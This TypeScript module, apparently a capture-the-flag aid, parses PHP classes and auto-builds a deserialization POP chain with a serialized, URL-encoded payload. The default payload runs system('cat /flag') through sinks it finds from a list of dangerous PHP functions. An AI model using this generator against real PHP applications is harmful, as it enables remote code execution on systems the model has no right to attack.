/**
 * PHP 反序列化 POP 链分析。
 *
 * 从多类源码中解析所有类、识别魔法方法与危险函数（sink），
 * 启发式地沿「属性引用 → 魔法方法」关系搭建 POP 链，并生成嵌套序列化 payload。
 */

import {
  type PhpProp,
  phpByteLength,
  phpPropKey,
  phpSerializeValue,
} from './phpSerialize';

export interface PhpClassInfo {
  name: string;
  props: PhpProp[];
  methods: { name: string; body: string }[];
}

export interface PopChainParam {
  key: string;
  label: string;
  value: string;
}

export interface PopChainInfo {
  /** 入口类名 */
  entry: string;
  /** sink 类名 */
  sink: string;
  /** 危险函数名 */
  sinkFunc: string;
  /** 链步骤描述 */
  steps: string[];
  /** 可读 payload（\x00 表示 NUL） */
  payload: string;
  /** URL 编码 payload */
  urlEncoded: string;
  /** 可编辑的标量参数 */
  params: PopChainParam[];
}

const DANGEROUS = ['call_user_func', 'call_user_func_array', 'system', 'exec', 'shell_exec', 'passthru', 'assert', 'eval'];

const MAGIC_ORDER = ['__destruct', '__wakeup', '__toString', '__invoke', '__call', '__get', '__set'];

/** 匹配配对花括号，返回右括号下标 */
function matchBrace(s: string, open: number): number {
  let depth = 0;
  for (let i = open; i < s.length; i++) {
    if (s[i] === '{') depth++;
    else if (s[i] === '}') {
      depth--;
      if (depth === 0) return i;
    }
  }
  return -1;
}

function extractProps(body: string): PhpProp[] {
  const props: PhpProp[] = [];
  const re = /\b(public|protected|private|var)\s+(\$[A-Za-z_]\w*(?:\s*,\s*\$[A-Za-z_]\w*)*)\s*(?:=[^;]*)?;/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(body)) !== null) {
    const visibility = m[1] === 'var' ? 'public' : (m[1] as PhpProp['visibility']);
    const names = m[2].match(/\$([A-Za-z_]\w*)/g) ?? [];
    for (const n of names) props.push({ name: n.slice(1), visibility });
  }
  return props;
}

function extractMethods(body: string): { name: string; body: string }[] {
  const methods: { name: string; body: string }[] = [];
  const re = /\bfunction\s+([A-Za-z_]\w*)\s*\(/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(body)) !== null) {
    const open = body.indexOf('{', m.index);
    if (open === -1) continue;
    const close = matchBrace(body, open);
    if (close === -1) continue;
    methods.push({ name: m[1], body: body.slice(open + 1, close) });
  }
  return methods;
}

/** 解析源码中所有 class（含属性与方法体） */
export function parsePhpClasses(source: string): PhpClassInfo[] {
  const classes: PhpClassInfo[] = [];
  const re = /\bclass\s+([A-Za-z_]\w*)/g;
  let m: RegExpExecArray | null;
  while ((m = re.exec(source)) !== null) {
    const open = source.indexOf('{', m.index);
    if (open === -1) continue;
    const close = matchBrace(source, open);
    if (close === -1) continue;
    const body = source.slice(open + 1, close);
    classes.push({ name: m[1], props: extractProps(body), methods: extractMethods(body) });
  }
  return classes;
}

interface Action {
  type: '__set' | '__get' | '__call' | '__invoke';
  prop: string;
}

/** 从方法体内提取「属性引用动作」（区分方法调用与属性调用） */
function findActionInBody(body: string, classInfo: PhpClassInfo): Action | null {
  const methodNames = new Set(classInfo.methods.map((x) => x.name));
  const propNames = new Set(classInfo.props.map((p) => p.name));

  // __call：$this->X->Y(
  let m = body.match(/\$this->(\w+)\s*->\s*(\w+)\s*\(/);
  if (m) return { type: '__call', prop: m[1] };
  // __set：$this->X->Y =
  m = body.match(/\$this->(\w+)\s*->\s*(\w+)\s*=/);
  if (m) return { type: '__set', prop: m[1] };
  // __invoke（直接）：$this->X(，且 X 是属性而非方法
  const invokeRe = /\$this->(\w+)\s*\(/g;
  let im: RegExpExecArray | null;
  while ((im = invokeRe.exec(body)) !== null) {
    if (propNames.has(im[1]) && !methodNames.has(im[1])) return { type: '__invoke', prop: im[1] };
  }
  // __invoke（间接）：$v = $this->X; ... $v()
  m = body.match(/\$(\w+)\s*=\s*\$this->(\w+)\s*;/);
  if (m && propNames.has(m[2]) && new RegExp('\\$' + m[1] + '\\s*\\(').test(body)) {
    return { type: '__invoke', prop: m[2] };
  }
  // __get：$this->X->Y（读）
  m = body.match(/\$this->(\w+)\s*->\s*(\w+)/);
  if (m) return { type: '__get', prop: m[1] };
  return null;
}

/** 提取某魔法方法的「下一步动作」（若 __destruct 等间接调用其它方法，则顺带查找） */
function findAction(classInfo: PhpClassInfo, magicMethod: string): Action | null {
  const method = classInfo.methods.find((x) => x.name === magicMethod);
  if (!method) return null;
  const direct = findActionInBody(method.body, classInfo);
  if (direct) return direct;

  const methodNames = new Set(classInfo.methods.map((x) => x.name));
  const called = method.body.match(/\$this->(\w+)\s*\(/g) ?? [];
  for (const c of called) {
    const name = c.match(/\$this->(\w+)\s*\(/)![1];
    if (!methodNames.has(name)) continue;
    const sub = classInfo.methods.find((x) => x.name === name);
    if (!sub) continue;
    const subAction = findActionInBody(sub.body, classInfo);
    if (subAction) return subAction;
  }
  return null;
}

/** 检测 sink：某个魔法方法体内包含危险函数 */
function detectSink(classes: PhpClassInfo[]): { className: string; magicMethod: string; func: string } | null {
  for (const mm of MAGIC_ORDER) {
    for (const c of classes) {
      const method = c.methods.find((x) => x.name === mm);
      if (!method) continue;
      for (const f of DANGEROUS) {
        if (method.body.includes(f)) return { className: c.name, magicMethod: mm, func: f };
      }
    }
  }
  for (const c of classes) {
    for (const method of c.methods) {
      for (const f of DANGEROUS) {
        if (method.body.includes(f)) return { className: c.name, magicMethod: method.name, func: f };
      }
    }
  }
  return null;
}

/** 检测入口：优先 __destruct */
function detectEntry(classes: PhpClassInfo[]): { className: string; magicMethod: string } | null {
  for (const mm of ['__destruct', '__wakeup', '__toString']) {
    for (const c of classes) {
      if (c.methods.some((x) => x.name === mm)) return { className: c.name, magicMethod: mm };
    }
  }
  return null;
}

/** 解析入口条件：如 $this->key == "happy new year" */
function findEntryCondition(classInfo: PhpClassInfo, magicMethod: string): { prop: string; value: string } | null {
  const method = classInfo.methods.find((x) => x.name === magicMethod);
  if (!method) return null;
  const m = method.body.match(/\$this->(\w+)\s*(?:===|==|!=|!==)\s*["']([^"']*)["']/);
  if (m) return { prop: m[1], value: m[2] };
  return null;
}

/** 解析 sink 参数：call_user_func($this->A, $this->B) 等 */
function findSinkParams(classInfo: PhpClassInfo, magicMethod: string, func: string): { funcProp: string | null; argProp: string | null } {
  const method = classInfo.methods.find((x) => x.name === magicMethod);
  if (!method) return { funcProp: null, argProp: null };
  if (func === 'call_user_func' || func === 'call_user_func_array') {
    const m = method.body.match(/\$this->(\w+)\s*,\s*\$this->(\w+)/);
    if (m) return { funcProp: m[1], argProp: m[2] };
  }
  const m2 = method.body.match(new RegExp(func.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\s*\\(\\s*\\$this->(\\w+)'));
  if (m2) return { funcProp: null, argProp: m2[1] };
  return { funcProp: null, argProp: null };
}

interface Edge {
  from: string;
  prop: string;
  to: string;
  action: string;
}

/** 从入口到 sink 搭建链 */
function buildChain(
  classes: PhpClassInfo[],
  entry: { className: string; magicMethod: string },
  sink: { className: string; magicMethod: string },
): { edges: Edge[]; steps: string[] } | null {
  const edges: Edge[] = [];
  const steps: string[] = [];
  let current = entry;
  let guard = 0;
  const maxDepth = classes.length + 3;
  while (!(current.className === sink.className && current.magicMethod === sink.magicMethod)) {
    if (guard++ > maxDepth) return null;
    const classInfo = classes.find((c) => c.name === current.className);
    if (!classInfo) return null;
    const action = findAction(classInfo, current.magicMethod);
    if (!action) return null;
    const target = classes.find((c) => c.methods.some((x) => x.name === action.type));
    if (!target) return null;
    edges.push({ from: current.className, prop: action.prop, to: target.name, action: action.type });
    steps.push(`${current.className}::${current.magicMethod}  →  \$${action.prop} 触发 ${target.name}::${action.type}`);
    current = { className: target.name, magicMethod: action.type };
  }
  return { edges, steps };
}

/** POP 链中的一个对象节点（数组按内层 → 外层排列） */
interface ChainNode {
  className: string;
  props: {
    name: string;
    visibility: PhpProp['visibility'];
    kind: 'scalar' | 'object';
    scalarValue?: string;
    childIndex?: number;
  }[];
}

/** 分析链结构（内部）：解析类、定位 sink/entry、搭建链并构建节点 */
function buildChainNodes(source: string): {
  classes: PhpClassInfo[];
  sink: { className: string; magicMethod: string; func: string };
  entry: { className: string; magicMethod: string };
  steps: string[];
  nodes: ChainNode[];
} | null {
  const classes = parsePhpClasses(source);
  if (classes.length < 2) return null;

  const sink = detectSink(classes);
  if (!sink) return null;
  const entry = detectEntry(classes);
  if (!entry) return null;
  if (entry.className === sink.className) return null;

  const built = buildChain(classes, entry, sink);
  if (!built) return null;
  const { edges, steps } = built;

  const sinkClass = classes.find((c) => c.name === sink.className)!;
  const sinkParams = findSinkParams(sinkClass, sink.magicMethod, sink.func);
  const entryClass = classes.find((c) => c.name === entry.className)!;
  const condition = findEntryCondition(entryClass, entry.magicMethod);
  const entryConditionValue = condition?.value ?? '';

  const sinkNode: ChainNode = {
    className: sinkClass.name,
    props: sinkClass.props.map((p) => {
      let scalarValue = '';
      if (sinkParams.funcProp === p.name) scalarValue = 'system';
      else if (sinkParams.argProp === p.name) scalarValue = 'cat /flag';
      return { name: p.name, visibility: p.visibility, kind: 'scalar', scalarValue };
    }),
  };
  const nodes: ChainNode[] = [sinkNode];

  for (let i = edges.length - 1; i >= 0; i--) {
    const edge = edges[i];
    const fromClass = classes.find((c) => c.name === edge.from)!;
    const isOutermost = i === 0;
    const childIndex = nodes.length - 1;
    const props: ChainNode['props'] = fromClass.props.map((p) => {
      if (p.name === edge.prop) {
        return { name: p.name, visibility: p.visibility, kind: 'object', childIndex };
      }
      const scalarValue = isOutermost && condition && p.name === condition.prop ? entryConditionValue : '';
      return { name: p.name, visibility: p.visibility, kind: 'scalar', scalarValue };
    });
    nodes.push({ className: fromClass.name, props });
  }

  return { classes, sink, entry, steps, nodes };
}

/** 分析并生成 POP 链（overrides 的 key 为 `${nodeIndex}.${propName}`，覆盖任意标量参数） */
export function analyzePopChain(
  source: string,
  overrides: Record<string, string> = {},
): PopChainInfo | null {
  const ctx = buildChainNodes(source);
  if (!ctx) return null;
  const { sink, entry, steps, nodes } = ctx;

  const serializeNode = (idx: number): string => {
    const node = nodes[idx];
    const entries = node.props
      .map((p) => {
        const key = phpPropKey(node.className, p.name, p.visibility);
        const value =
          p.kind === 'object'
            ? serializeNode(p.childIndex!)
            : phpSerializeValue(overrides[`${idx}.${p.name}`] ?? (p.scalarValue ?? ''));
        return `s:${phpByteLength(key)}:"${key}";${value}`;
      })
      .join('');
    return `O:${phpByteLength(node.className)}:"${node.className}":${node.props.length}:{${entries}}`;
  };
  const payload = serializeNode(nodes.length - 1);

  const readable = payload.replace(/\u0000/g, '\\x00');
  let urlEncoded = '';
  try {
    urlEncoded = encodeURIComponent(payload);
  } catch {
    urlEncoded = '(URL 编码失败)';
  }

  const classNameCounts: Record<string, number> = {};
  for (const n of nodes) classNameCounts[n.className] = (classNameCounts[n.className] ?? 0) + 1;
  const seen: Record<string, number> = {};
  const params: PopChainParam[] = [];
  for (let i = nodes.length - 1; i >= 0; i--) {
    const node = nodes[i];
    for (const p of node.props) {
      if (p.kind !== 'scalar') continue;
      seen[node.className] = (seen[node.className] ?? 0) + 1;
      const suffix = classNameCounts[node.className] > 1 ? ` #${seen[node.className]}` : '';
      params.push({
        key: `${i}.${p.name}`,
        label: `${node.className}::$${p.name}${suffix}`,
        value: p.scalarValue ?? '',
      });
    }
  }

  return {
    entry: entry.className,
    sink: sink.className,
    sinkFunc: sink.func,
    steps,
    payload: readable,
    urlEncoded,
    params,
  };
}

/** ChainNode → ManualNode（把自动检测到的链转成手动编辑器默认结构） */
function chainNodeToManualNode(nodes: ChainNode[], index: number): ManualNode {
  const node = nodes[index];
  return {
    className: node.className,
    props: node.props.map((p) => {
      if (p.kind === 'object') {
        return {
          name: p.name,
          visibility: p.visibility,
          type: 'object' as const,
          value: '',
          child: chainNodeToManualNode(nodes, p.childIndex!),
        };
      }
      return { name: p.name, visibility: p.visibility, type: 'scalar' as const, value: p.scalarValue ?? '' };
    }),
  };
}

/** 生成自动检测到的 POP 链对应的手工节点（作为手动编辑器默认值） */
export function buildPopChainManualNode(source: string): ManualNode | null {
  const ctx = buildChainNodes(source);
  if (!ctx) return null;
  return chainNodeToManualNode(ctx.nodes, ctx.nodes.length - 1);
}

/** 手工构建的对象节点（用于完全手动编辑） */
export interface ManualProp {
  name: string;
  visibility: PhpProp['visibility'];
  type: 'scalar' | 'object';
  value: string;
  child?: ManualNode;
}
export interface ManualNode {
  className: string;
  props: ManualProp[];
}

/** 根据类名初始化手工节点（所有属性默认空标量） */
export function initManualNode(className: string, classes: PhpClassInfo[]): ManualNode {
  const c = classes.find((x) => x.name === className);
  return {
    className,
    props: (c?.props ?? []).map((p) => ({
      name: p.name,
      visibility: p.visibility,
      type: 'scalar',
      value: '',
    })),
  };
}

/** 序列化手工对象树 */
export function serializeManualNode(node: ManualNode): string {
  const entries = node.props.map((p) => {
    const key = phpPropKey(node.className, p.name, p.visibility);
    const value =
      p.type === 'object' && p.child ? serializeManualNode(p.child) : phpSerializeValue(p.value ?? '');
    return `s:${phpByteLength(key)}:"${key}";${value}`;
  }).join('');
  return `O:${phpByteLength(node.className)}:"${node.className}":${node.props.length}:{${entries}}`;
}
